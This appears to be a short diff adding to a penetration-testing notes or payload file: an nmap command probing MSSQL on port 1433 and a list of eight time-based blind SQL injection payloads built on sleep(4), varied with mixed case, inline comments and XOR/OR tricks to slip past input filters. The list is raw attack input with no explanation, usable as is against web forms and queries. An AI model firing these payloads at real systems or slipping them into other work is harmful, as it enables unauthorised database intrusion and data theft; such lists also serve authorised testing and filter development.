@@ -1,1 +1,13 @@
+```
 nmap -p 1433 --script ms-sql-info <IP>
+```
+
+
+'%27 OR sleep(4) --
+'OR 6-2=4 || sleep(4) --
+') OR true+true=sleep(4) --
+%27 oR sLeEp(4) = (true) --
+' xor sLeEP((4)) --
+%27 = (1=(sleep(4))) --
+' XOR sleep(/**/4)
+'%27 OR sleep(4) || (true=true) -- ')
